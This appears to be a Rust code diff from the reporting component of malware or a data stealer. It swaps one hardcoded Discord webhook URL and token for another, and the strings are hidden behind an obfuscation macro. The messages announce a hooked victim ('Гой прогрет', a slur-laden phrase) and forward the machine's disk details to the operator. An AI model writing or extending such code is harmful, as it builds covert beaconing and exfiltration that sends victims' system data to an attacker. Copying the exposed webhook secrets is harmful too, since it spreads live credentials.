@@ -4,10 +4,9 @@ use webhook::client::WebhookClient;
 use human_bytes::human_bytes;
 
 pub(crate) async fn send_message() {
-    let url: String = lc!( "https://discord.com/api/webhooks/1215614220855410748/fR-qxnsf9xgT-9wsGHSilEYkdeEEp4OLrSsqh-tPU4HLpdUGJyefmYj1cieOGD_azZUS");
+    let url: String = lc!( "https://discord.com/api/webhooks/1215731916465115156/_o8vpLX78E9m7mUwX4dE-X7cU7cuZ5fTGhIt46ylPgpnhGtM5WhU9wA89z8MzdTx7cuj");
     let client: WebhookClient = WebhookClient::new(&url);
     client.send(|message| message
-        .username(&lc!("Вентилятор"))
         .embed(|embed| embed
             .color(&lc!("15417396"))
             .title(&lc!("Гой прогрет"))
@@ -17,10 +16,9 @@ pub(crate) async fn send_message() {
 
 
 pub(crate) async fn send_disk_message(disk: String) {
-    let url: String = lc!( "https://discord.com/api/webhooks/1215614220855410748/fR-qxnsf9xgT-9wsGHSilEYkdeEEp4OLrSsqh-tPU4HLpdUGJyefmYj1cieOGD_azZUS");
+    let url: String = lc!( "https://discord.com/api/webhooks/1215731916465115156/_o8vpLX78E9m7mUwX4dE-X7cU7cuZ5fTGhIt46ylPgpnhGtM5WhU9wA89z8MzdTx7cuj");
     let client: WebhookClient = WebhookClient::new(&url);
     client.send(|message| message
-        .username(&lc!("Вентилятор"))
         .embed(|embed| embed
             .color(&lc!("15417396"))
             .title(&lc!("Доп. информациия"))
